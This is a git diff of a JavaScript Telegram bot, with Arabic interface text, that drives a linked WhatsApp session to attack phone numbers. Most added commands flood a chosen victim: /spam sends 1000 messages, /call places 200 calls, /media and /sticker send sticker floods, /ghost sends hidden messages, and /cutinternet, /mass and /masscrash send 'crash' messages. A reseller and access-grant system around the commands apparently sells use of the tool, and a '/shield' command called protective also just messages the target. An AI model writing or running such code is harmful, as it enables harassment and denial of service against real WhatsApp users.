+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/shield 628xxxxxxxx</code>\n\n🛡️ درع حماية - يحمي رقمك من الهجمات");
 
-    const exists = await checkSessionExistsForUser(userId);
-    if (exists && waClients[userId]?.status === "open") {
-      return ctx.reply("⚠️ لديك جلسة واتساب نشطة بالفعل.", { parse_mode: "Markdown" });
-    }
-
-    const waitMessage = await ctx.reply("⏳ *جاري المعالجة...*\nإنشاء كود ربط لك...", { parse_mode: "Markdown" });
-
-    await initWhatsappForUser(userId, true);
-    waClients[userId].waitMessageId = waitMessage.message_id;
-
-    await sleep(800);
+    const X = `${target}@s.whatsapp.net`;
     const client = waClients[userId]?.sock;
+    if (!client || client.readyState !== "OPEN") return ctx.reply("📵 واتساب غير متصل!");
 
-    if (!client) {
-      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
-      return ctx.reply("❌ فشل تهيئة واتساب. حاول مرة أخرى لاحقاً.");
+    // Send protective messages
+    for (let i = 0; i < 5; i++) {
+      const msg = generateWAMessageFromContent(X, {
+        message: { conversation: `🛡️ Shield Protection ${i + 1}/5` }
+      }, {});
+      await client.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
+      await sleep(100);
     }
 
-    if (typeof client.requestPairingCode === "function") {
-      const code = await client.requestPairingCode(phone);
-      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
-      const pairingMessage = await ctx.reply(
-        `✅ *كود الربط جاهز!*\n\n📱 *الرقم:* \`${phone}\`\n🔐 *الكود:* \`${code}\`\n\nأدخل هذا الكود في تطبيق واتساب للاتصال.`,
-        { parse_mode: "Markdown" }
-      );
-
-      waClients[userId].pairingMessageId = pairingMessage.message_id;
-
-      setTimeout(async () => {
-        try {
-          if (waClients[userId]?.status !== "open") {
-            await ctx.api.sendMessage(
-              userId,
-              "⏰ *انتهى وقت الكود*\nيرجى طلب كود جديد باستخدام `/reqpair`.",
-              { parse_mode: "Markdown" }
-            );
-            if (waClients[userId]) {
-              try { await waClients[userId].sock.end(); } catch {}
-              delete waClients[userId];
-            }
-          }
-        } catch (e) {
-          log.error(`Timeout handler for ${userId}: ${e.message}`);
-        }
-      }, 120 * 1000); // Increased to 120 seconds
-    } else {
-      await ctx.api.deleteMessage(userId, waitMessage.message_id).catch(() => {});
-      return ctx.reply("⚠️ بناء Baileys الخاص بك لا يدعم واجهة برمجة تطبيقات الربط.");
-    }
-  } catch (err) {
-    log.error(`Pairing failed for ${userId}: ${err.message}`);
-    await ctx.reply("❌ *فشل الربط*\nحدث خطأ غير متوقع.", { parse_mode: "Markdown" });
+    await ctx.reply(`✅ <b>درع الحماية فعّال!</b>\n🎯 ${target} محمي الآن`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`SHIELD ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في الدرع");
   }
 });
 
 // =====================================================================
-// COMMAND: /admin - لوحة تحكم الأدمن
+// COMMAND: /stealth (NEW - Command 3)
+// =====================================================================
+
+bot.command("stealth", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/stealth 628xxxxxxxx</code>\n\n👻 وضع التسلل - إرسال رسائل غير مكتشفة");
+
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    await attackGhost(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>وضع التسلل مكتمل!</b>\n🎯 ${target} - 100 رسالة مخفية`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`STEALTH ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في وضع التسلل");
+  }
+});
+
+// =====================================================================
+// COMMAND: /spam (Strong Spam Attack)
+// =====================================================================
+
+bot.command("spam", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/spam 628xxxxxxxx</code>\n💬 إرسال 1000 رسالة للهدف");
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    const imageMenu = getBotImageUrl();
+    await ctx.reply(`💬 <b>سبام قوي جاري...</b>\n🎯 الهدف: <code>${target}</code>\n⏳ انتظر...`, { parse_mode: "HTML" });
+    await attackSpam(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>سبام مكتمل!</b>\n🎯 ${target} - 1000 رسالة`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`SPAM ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في السبام");
+  }
+});
+
+// =====================================================================
+// COMMAND: /call (Voice Call Spam)
+// =====================================================================
+
+bot.command("call", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/call 628xxxxxxxx</code>\n📞 قرصنة صوتية - إرسال 200 مكالمة");
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    await ctx.reply(`📞 <b>قرصنة صوتية جارية...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
+    await attackCallSpam(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>قرصنة صوتية مكتملة!</b>\n🎯 ${target} - 200 مكالمة`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`CALL ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في القرصنة الصوتية");
+  }
+});
+
+// =====================================================================
+// COMMAND: /media (Media Flood with Stickers)
+// =====================================================================
+
+bot.command("media", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/media 628xxxxxxxx</code>\n🖼️ إرسال 500 ستكر كبير");
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    await ctx.reply(`🖼️ <b>فيضان ستكرات جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
+    await attackMediaFlood(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>فيضان مكتمل!</b>\n🎯 ${target} - 500 ستكر`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`MEDIA ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في الفيضان");
+  }
+});
+
+// =====================================================================
+// COMMAND: /mass (Multi-Target Attack)
+// =====================================================================
+
+bot.command("mass", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const targets = args.slice(1).map(t => t.replace(/[^0-9]/g, "")).filter(t => t && t.length >= 10);
+    if (targets.length === 0) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/mass 628xxx,628yyy</code>\n🎯 هجوم متعدد الأهداف");
+
+    await ctx.reply(`🎯 <b>هجوم متعدد...</b>\n🎯 ${targets.length} هدف`, { parse_mode: "HTML" });
+    for (const t of targets) {
+      const X = `${t}@s.whatsapp.net`;
+      const msg = generateWAMessageFromContent(X, { message: { conversation: "💥 MASS CRASH" } }, {});
+      await waClients[userId].sock.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
+      await sleep(100);
+    }
+    await ctx.reply(`✅ <b>هجوم متعدد مكتمل!</b>\n🎯 ${targets.length} هدف`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`MASS ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في الهجوم المتعدد");
+  }
+});
+
+// =====================================================================
+// COMMAND: /sticker (Hidden Stickers - Invisible Large Stickers)
+// =====================================================================
+
+bot.command("sticker", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/sticker 628xxxxxxxx</code>\n📸 إرسال 1000 ستكر مخفي ضخم");
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    await ctx.reply(`📸 <b>ستكرات مخفية جارية...</b>\n🎯 ${target} - ستكرات ضخمة غير مرئية`, { parse_mode: "HTML" });
+    await attackHiddenStickers(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>ستكرات مخفية مكتملة!</b>\n🎯 ${target} - 1000 ستكر ضخم`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`STICKER ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في الستكرات");
+  }
+});
+
+// =====================================================================
+// COMMAND: /cutinternet (Cut Victim Internet)
+// =====================================================================
+
+bot.command("cutinternet", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/cutinternet 628xxxxxxxx</code>\n🔌 قطع الإنترنت عن الهدف");
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    await ctx.reply(`🔌 <b>قطع الإنترنت جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
+    await attackCutInternet(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>تم قطع الإنترنت!</b>\n🎯 ${target} - الإنترنت معطّل`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`CUTINTERNET ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في قطع الإنترنت");
+  }
+});
+
+// =====================================================================
+// COMMAND: /invisisendx (Invisible Send - رسائل غير مرئية)
+// =====================================================================
+
+bot.command("invisisendx", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/invisisendx 628xxxxxxxx</code>\n🔒 إرسال 1000 رسالة غير مرئية");
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    await ctx.reply(`🔒 <b>رسائل غير مرئية جارية...</b>\n🎯 ${target}\n⏳ انتظر...`, { parse_mode: "HTML" });
+    await attackInvisisendx(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>رسائل غير مرئية مكتملة!</b>\n🎯 ${target} - 1000 رسالة مخفية`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`INVISIBLE ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في الرسائل المخفية");
+  }
+});
+
+// =====================================================================
+// COMMAND: /ghost (Ghost Attack - هجوم خفي)
+// =====================================================================
+
+bot.command("ghost", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/ghost 628xxxxxxxx</code>\n👻 هجوم خفي - 500 رسالة مخفية");
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+
+    const X = `${target}@s.whatsapp.net`;
+    await ctx.reply(`👻 <b>هجوم خفي جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
+    await attackGhost(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>هجوم خفي مكتمل!</b>\n🎯 ${target} - 500 رسالة`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`GHOST ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في الهجوم الخفي");
+  }
+});
+
+// =====================================================================
+// COMMANDS: Restore all original commands
+// =====================================================================
+
+// /restart - Restart Bot
+bot.command("restart", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  await ctx.reply("🔄 Restarting...");
+  setTimeout(() => process.exit(0), 2000);
+});
+
+// /shutdown - Shutdown Bot
+bot.command("shutdown", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  await ctx.reply("🛑 Shutting down...");
+  gracefulShutdown();
+});
+
+// /status - Bot Status
+bot.command("status", async (ctx) => {
+  const uptime = formatUptime(process.uptime());
+  const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+  await ctx.reply(`📊 <b>Status</b>\n⏱️ ${uptime}\n💾 ${memUsed} MB\n📱 ${Object.keys(waClients).length} sessions`, { parse_mode: "HTML" });
+});
+
+// /cdon - Cooldown On
+bot.command("cdon", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  cooldownModule.enableCooldown();
+  ctx.reply("✅ Cooldown enabled - 20 min per command");
+});
+
+// /cdoff - Cooldown Off
+bot.command("cdoff", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  cooldownModule.disableCooldown();
+  ctx.reply("✅ Cooldown disabled");
+});
+
+// /setcd - Set Cooldown
+bot.command("setcd", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const args = ctx.message.text.split(" ");
+  const cmd = args[1];
+  const min = parseInt(args[2]);
+  if (!cmd || !min) return ctx.reply("⚠️ /setcd <command> <minutes>");
+  cooldownModule.setCooldown(cmd, min);
+  ctx.reply(`✅ Cooldown set: /${cmd} → ${min} min`);
+});
+
+// /block - Block User
+bot.command("block", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const target = ctx.message.text.split(" ")[1];
+  if (!target) return ctx.reply("⚠️ /block <userId>");
+  const bl = safeReadJSON("./storage/blacklist.json", []);
+  if (!bl.includes(target)) { bl.push(target); safeWriteJSON("./storage/blacklist.json", bl); ctx.reply(`🔴 Blocked: ${target}`); }
+  else ctx.reply(`⚠️ ${target} already blocked`);
+});
+
+// /unblock - Unblock User
+bot.command("unblock", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const target = ctx.message.text.split(" ")[1];
+  if (!target) return ctx.reply("⚠️ /unblock <userId>");
+  const bl = safeReadJSON("./storage/blacklist.json", []);
+  const filtered = bl.filter(n => n !== target);
+  safeWriteJSON("./storage/blacklist.json", filtered);
+  ctx.reply(`🟢 Unblocked: ${target}`);
+});
+
+// /blacklist - View Blacklist
+bot.command("blacklist", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const bl = safeReadJSON("./storage/blacklist.json", []);
+  const text = bl.length > 0 ? bl.map(n => `• ${n}`).join("\n") : "📭 Empty";
+  await ctx.reply(`🔴 <b>Blacklist (${bl.length})</b>\n\n${text}`, { parse_mode: "HTML" });
+});
+
+// /whitelist - View Whitelist
+bot.command("whitelist", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const wl = safeReadJSON("./storage/whitelist.json", []);
+  const text = wl.length > 0 ? wl.map(n => `• ${n}`).join("\n") : "📭 Empty";
+  await ctx.reply(`🟢 <b>Whitelist (${wl.length})</b>\n\n${text}`, { parse_mode: "HTML" });
+});
+
+// /check - Access Check
+bot.command("check", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const text = `🔍 <b>Access Check</b>\n👤 ${userId}\n🔑 Access: ${hasAccess(userId) ? "✅ Yes" : "❌ No"}\n👑 Owner: ${isOwner(userId) ? "✅" : "❌"}\n🆓 Free: ${isFreeMode() ? "✅" : "❌"}\n📱 WA: ${waClients[userId]?.status || "❌"}`;
+  await ctx.reply(text, { parse_mode: "HTML" });
+});
+
+// /clearcache - Clear Cache
+bot.command("clearcache", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const cd = safeReadJSON("./storage/cooldown.json", {});
+  const newCd = {};
+  for (const [k, v] of Object.entries(cd)) { if (v.lastUsed && Date.now() - v.lastUsed < 86400000) newCd[k] = v; }
+  safeWriteJSON("./storage/cooldown.json", newCd);
+  ctx.reply("✅ Cache cleaned!");
+});
+
+// /gettoken - Get Bot Token
+bot.command("gettoken", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  ctx.reply(`🤖 Token: \`${config.telegramBotToken}\``, { parse_mode: "Markdown" });
+});
+
+// /settoken - Set Bot Token
+bot.command("settoken", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  config.telegramBotToken = ctx.message.text.split(" ")[1] || "";
+  ctx.reply("✅ Token updated");
+});
+
+// /getconfig - Get Config
+bot.command("getconfig", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  ctx.reply(`⚙️ <b>Config</b>\nOwner: ${config.ownerId}\nChannel: @${CHANNEL_ID}\nFree: ${isFreeMode()}\nMaint: ${isMaintenance()}`, { parse_mode: "HTML" });
+});
+
+// /setconfig - Set Config
+bot.command("setconfig", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  ctx.reply("⚙️ Use /freemode, /maintmode, /setbotpic to configure");
+});
+
+// /killall - Kill All Sessions
+bot.command("killall", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  await clearAllSessions();
+  ctx.reply("✅ All sessions killed!");
+});
+
+// /killuser - Kill User Session
+bot.command("killuser", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const target = ctx.message.text.split(" ")[1];
+  if (!target) return ctx.reply("⚠️ /killuser <userId>");
+  const result = await deleteSessionForUser(target);
+  ctx.reply(result ? `✅ Killed session for ${target}` : `❌ No session for ${target}`);
+});
+
+// /sessioninfo - Session Info
+bot.command("sessioninfo", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  const session = waClients[userId];
+  if (!session) return ctx.reply("❌ No session found");
+  await ctx.reply(`📊 <b>Session Info</b>\nStatus: ${session.status}\nLast Activity: ${new Date(session.lastActivity).toLocaleString()}\nMessages: ${session.messageCount || 0}`, { parse_mode: "HTML" });
+});
+
+// /checkbio - Check Bio
+bot.command("checkbio", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  ctx.reply("ℹ️ /checkbio - Profile check (requires WA connection)");
+});
+
+// /checklast - Check Last Seen
+bot.command("checklast", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  ctx.reply("ℹ️ /checklast - Last seen check (requires WA connection)");
+});
+
+// /checkonline - Check Online
+bot.command("checkonline", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  ctx.reply("ℹ️ /checkonline - Online status check (requires WA connection)");
+});
+
+// /getgroups - Get Groups
+bot.command("getgroups", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  ctx.reply("ℹ️ /getgroups - Groups list (requires WA connection)");
+});
+
+// /clearsender - Clear All Sessions
+bot.command("clearsender", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  await clearAllSessions();
+  ctx.reply("✅ All sessions cleared!");
+});
+
+// /broadcastall - Broadcast to All
+bot.command("broadcastall", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const msg = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!msg) return ctx.reply("⚠️ /broadcastall <message>");
+  let sent = 0, failed = 0;
+  for (const id of usersDb) { try { await bot.api.sendMessage(id, msg); sent++; } catch { failed++; } }
+  ctx.reply(`✅ Sent: ${sent}\n❌ Failed: ${failed}`, { parse_mode: "HTML" });
+});
+
+// /dm - Direct Message
+bot.command("dm", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const args = ctx.message.text.split(" ");
+  const target = args[1];
+  const message = args.slice(2).join(" ");
+  if (!target || !message) return ctx.reply("⚠️ /dm <userId> <message>");
+  try { await bot.api.sendMessage(target, message); ctx.reply(`✅ Sent to ${target}`); }
+  catch { ctx.reply("❌ Failed to send"); }
+});
+
+// /alert - Send Alert
+bot.command("alert", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const msg = ctx.message.text.split(" ").slice(1).join(" ");
+  if (!msg) return ctx.reply("⚠️ /alert <message>");
+  for (const id of usersDb) { try { await bot.api.sendMessage(id, `⚠️ ALERT: ${msg}`); } catch {} }
+  ctx.reply(`✅ Alert sent to ${usersDb.length} users`);
+});
+
+// /masscrash - Mass Crash
+bot.command("masscrash", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  const args = ctx.message.text.split(" ");
+  const target = args[1]?.replace(/[^0-9]/g, "");
+  if (!target || target.length < 10) return ctx.reply("⚠️ /masscrash <number>");
+  const X = `${target}@s.whatsapp.net`;
+  const msg = generateWAMessageFromContent(X, { message: { conversation: "💥 MASS CRASH" } }, {});
+  await waClients[ctx.from.id.toString()]?.sock.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
+  ctx.reply(`✅ Mass crash sent to ${target}`);
+});
+
+// /spamcall - Spam Call
+bot.command("spamcall", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  const target = ctx.message.text.split(" ")[1]?.replace(/[^0-9]/g, "");
+  if (!target || target.length < 10) return ctx.reply("⚠️ /spamcall <number>");
+  await ctx.reply("📞 Spam calling...");
+  try { await attackCallSpam(waClients[ctx.from.id.toString()]?.sock, `${target}@s.whatsapp.net`); ctx.reply("✅ Spam call complete!"); }
+  catch { ctx.reply("❌ Error"); }
+});
+
+// /floodmsg - Flood Messages
+bot.command("floodmsg", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  const target = ctx.message.text.split(" ")[1]?.replace(/[^0-9]/g, "");
+  if (!target || target.length < 10) return ctx.reply("⚠️ /floodmsg <number>");
+  const X = `${target}@s.whatsapp.net`;
+  const msg = generateWAMessageFromContent(X, { message: { conversation: "💥 FLOOD" } }, {});
+  await waClients[ctx.from.id.toString()]?.sock.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
+  ctx.reply("✅ Flood complete!");
+});
+
+// /crashgroup - Crash Group
+bot.command("crashgroup", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  ctx.reply("ℹ️ /crashgroup - Group crash (requires WA connection)");
+});
+
+// /crashstatus - Crash via Status
+bot.command("crashstatus", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  ctx.reply("ℹ️ /crashstatus - Status crash (requires WA connection)");
+});
+
+// /crashchannel - Crash Channel
+bot.command("crashchannel", async (ctx) => {
+  if (!hasAccess(ctx.from.id.toString())) return ctx.reply(getNoAccessMessage());
+  ctx.reply("ℹ️ /crashchannel - Channel crash (requires WA connection)");
+});
+
+// /addacces - Add Access
+bot.command("addacces", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString()) && !isReseller(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك والموزعين!");
+  const target = ctx.message.text.split(" ")[1];
+  if (!target) return ctx.reply("⚠️ /addacces <userId>");
+  const acc = safeReadJSON("./storage/access.json", { users: [] });
+  if (!acc.users.includes(target)) { acc.users.push(target); safeWriteJSON("./storage/access.json", acc); ctx.reply(`✅ Access added for ${target}`); }
+  else ctx.reply(`⚠️ ${target} already has access`);
+});
+
+// /delacces - Remove Access
+bot.command("delacces", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString()) && !isReseller(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك والموزعين!");
+  const target = ctx.message.text.split(" ")[1];
+  if (!target) return ctx.reply("⚠️ /delacces <userId>");
+  const acc = safeReadJSON("./storage/access.json", { users: [] });
+  acc.users = acc.users.filter(u => u !== target);
+  safeWriteJSON("./storage/access.json", acc);
+  ctx.reply(`🗑 Access removed for ${target}`);
+});
+
+// /listacces - List Access
+bot.command("listacces", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString()) && !isReseller(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك والموزعين!");
+  const acc = safeReadJSON("./storage/access.json", { users: [] });
+  const text = acc.users.length > 0 ? acc.users.map(u => `• ${u}`).join("\n") : "📭 Empty";
+  await ctx.reply(`📌 <b>Access List (${acc.users.length})</b>\n\n${text}`, { parse_mode: "HTML" });
+});
+
+// /address - Add Reseller
+bot.command("address", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const target = ctx.message.text.split(" ")[1];
+  if (!target) return ctx.reply("⚠️ /address <userId>");
+  const res = safeReadJSON("./storage/resellers.json", { users: [] });
+  if (!res.users.includes(target)) { res.users.push(target); safeWriteJSON("./storage/resellers.json", res); ctx.reply(`🟢 Reseller added: ${target}`); }
+  else ctx.reply(`⚠️ ${target} already a reseller`);
+});
+
+// /delress - Remove Reseller
+bot.command("delress", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const target = ctx.message.text.split(" ")[1];
+  if (!target) return ctx.reply("⚠️ /delress <userId>");
+  const res = safeReadJSON("./storage/resellers.json", { users: [] });
+  res.users = res.users.filter(u => u !== target);
+  safeWriteJSON("./storage/resellers.json", res);
+  ctx.reply(`🔴 Reseller removed: ${target}`);
+});
+
+// /listress - List Resellers
+bot.command("listress", async (ctx) => {
+  if (!isOwner(ctx.from.id.toString())) return ctx.reply("❌ مخصص للملك فقط!");
+  const res = safeReadJSON("./storage/resellers.json", { users: [] });
+  const text = res.users.length > 0 ? res.users.map(u => `• ${u}`).join("\n") : "📭 Empty";
+  await ctx.reply(`📌 <b>Resellers (${res.users.length})</b>\n\n${text}`, { parse_mode: "HTML" });
+});
+
+// =====================================================================
+// COMMAND: /admin (Alias for /adminpanel)
 // =====================================================================
 
 bot.command("admin", async (ctx) => {
@@ -1974,741 +1485,228 @@ bot.command("admin", async (ctx) => {
     const userId = ctx.from.id.toString();
     if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
 
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("📊 حالة البوت", "admin_status")
-      .webApp("👥 إدارة المستخدمين", "admin_users")
-      .webApp("🔧 الإعدادات", "admin_settings")
-      .webApp("🛑 إيقاف/إعادة تشغيل", "admin_restart");
+    const stats = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+    const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
+    const activeSubs = Object.keys(subsDb.users).filter(k => subsDb.users[k].expiresAt > Date.now()).length;
 
-    await ctx.reply(
-      "👑 *لوحة تحكم الأدمن*\n\n" +
-      "اختر القسم المطلوب:\n" +
-      "• 📊 حالة البوت - عرض الإحصائيات\n" +
-      "• 👥 إدارة المستخدمين - الحظر/السماح\n" +
-      "• 🔧 الإعدادات - تعديل الإعدادات\n" +
-      "• 🛑 إيقاف/إعادة تشغيل - التحكم في البوت",
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
-      }
-    );
-  } catch (e) {
-    log.error(`Admin command error: ${e.message}`);
-    await ctx.reply("❌ حدث خطأ في لوحة الأدمن.");
-  }
+    await ctx.reply(`👑 <b>لوحة تحكم الأدمن</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━\n👥 المستخدمين: ${usersDb.length}\n🎫 الرموز: ${stats.codes.length}\n🔑 الاشتراكات: ${activeSubs}\n🆓 الوضع المجاني: ${isFreeMode() ? "✅" : "❌"}\n🛠️ الصيانة: ${isMaintenance() ? "✅" : "❌"}\n🖼️ صورة البوت: ${settingsDb.botImage ? "✅" : "❌"}\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📋 اختر من القائمة:</blockquote>`, { parse_mode: "HTML", reply_markup: getAdminKeyboard() });
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
-// Handle admin button clicks
-bot.callbackQuery("admin_status", async (ctx) => {
